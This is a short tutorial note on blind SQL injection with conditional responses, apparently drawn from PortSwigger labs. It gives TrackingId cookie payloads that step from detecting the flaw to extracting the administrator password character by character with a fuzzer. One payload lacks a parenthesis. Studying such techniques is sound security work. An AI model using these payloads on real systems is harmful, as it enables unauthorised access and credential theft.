---
title: Conditional Responses
date: 2025-10-13
description: Notes of blind SQL injection with conditional responses.
weight: 1
---

## Principles

A type of blind SQL injection is triggering conditional responses.

For example, there is a request to an application including a cookie header like:

```text
Cookie: TrackingId=xxx
```

And the backend query may be:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'xxx'
```

Suppose that the frontend will display a message `Welcome back` if the query is valid. Otherwise, it won't display.

This is possible to be injected blindly.

If there is a table named `users` that stores information of users, and our goal is to gain `administrator` information, we can use the following payload to find out the injection vulnerability:

```text
Cookie: TrackingId=xxx' AND '1'='1
Cookie: TrackingId=xxx' AND '1'='2
```

If the frontend changed, then it is injectable.

Then we can use `SELECT` to determine whether the table `users` exists.

```text
Cookie: TrackingId=xxx' AND (SELECT 'a' FROM users LIMIT 1)='a
```

If the message `Welcome back` is displayed, it can be confirmed that `users` table exists.

To determine whether the user `administrator` exists, we can simply modify the payload above to:

```text
Cookie: TrackingId=xxx' AND SELECT 'a' FROM users WHERE username='administrator')='a
```

After that, we can find out the length of password by using the following payload:

```text
Cookie: TrackingId=xxx' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>$guess-length$)='a
```

The `$guess-length$` is a series of numbers to determine the length of password.

Then, we can retrieve the password by using the `SUBSTRING` function. The payload is:

```text
Cookie: TrackingId=xxx' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator') = 'a
```

By changing `a` to any other characters until the message `Welcome back` shown, we can finally get the first character of the password.

In [Zed Attack Proxy (ZAP)](https://www.zaproxy.org) or [Burp Suite](https://portswigger.net), modify the request to

```text
Cookie: TrackingId=xxx' AND (SELECT SUBSTRING(password,$index$,1) FROM users WHERE username = 'administrator') = '$guess-char$
```

Then use the fuzz tool, and we can retrieve the password.

## Reference

- [PortSwigger](https://portswigger.net/)
